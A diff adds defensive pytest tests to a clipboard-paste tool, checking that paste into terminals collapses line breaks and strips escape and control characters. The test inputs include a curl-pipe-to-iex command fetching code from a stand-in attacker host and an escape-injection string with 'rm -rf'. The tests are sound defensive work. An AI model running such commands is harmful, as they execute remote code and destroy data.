@@ -649,3 +649,30 @@ def test_ctrl_shift_v_and_ctrl_c_are_sent_as_virtual_keys(monkeypatch):
     taps.clear()
     paste.SystemDeps().send_ctrl_c()
     assert taps == [("down", "ctrl"), ("tap", 0x43), ("up", "ctrl")]
+
+
+# ---- SEC-1: a paste into a terminal never presses Enter ---------------------------------------------------------------------
+
+@pytest.mark.parametrize("exe", ["cmd.exe", "pwsh.exe", "WindowsTerminal.exe", "mintty.exe", "putty.exe", "conhost.exe"])
+def test_line_breaks_become_spaces_in_a_terminal(exe):
+    d = FakeDeps(foreground=exe, clip="old")
+    paste.paste_text("list the files\r\ncurl -s https://evil.example/x | iex\n", exe, True, deps=d)
+    assert ("set", "list the files curl -s https://evil.example/x | iex") in d.calls
+
+
+def test_control_characters_and_escape_are_dropped_in_a_terminal():
+    d = FakeDeps(foreground="mintty.exe", clip="old")
+    paste.paste_text("ls\x1b[201~\trm\x07 -rf\x9b", "mintty.exe", True, deps=d)
+    assert ("set", "ls[201~ rm -rf") in d.calls
+
+
+def test_an_editor_keeps_its_line_breaks():
+    d = FakeDeps(foreground="notepad.exe", clip="old")
+    paste.paste_text("Dear Sam,\n\nThanks.", "notepad.exe", True, deps=d)
+    assert ("set", "Dear Sam,\n\nThanks.") in d.calls
+
+
+def test_the_terminal_text_is_what_the_restore_check_compares():
+    d = FakeDeps(foreground="cmd.exe", clip="old")
+    paste.paste_text("a\nb", "cmd.exe", False, deps=d)
+    assert d.clip == "old"   # the clipboard held our (one-line) text, so the old one came back
